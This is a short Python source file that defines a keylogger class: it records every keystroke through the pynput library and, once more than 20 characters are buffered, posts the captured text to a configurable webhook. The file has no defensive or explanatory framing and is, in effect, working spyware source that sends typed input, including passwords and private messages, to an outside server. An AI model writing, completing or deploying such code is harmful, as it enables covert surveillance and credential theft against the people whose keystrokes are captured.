import requests
from pynput import keyboard
import threading

class Keylogger:
    def __init__(self, webhook):
        self.webhook = webhook
        self.log = ""

    def callback(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f' [{key}] '

        if len(self.log) > 20:
            self.send_log()

    def send_log(self):
        requests.post(self.webhook, json={"content": self.log})
        self.log = ""

    def start(self):
        listener = keyboard.Listener(on_press=self.callback)
        listener.start()
        listener.join()
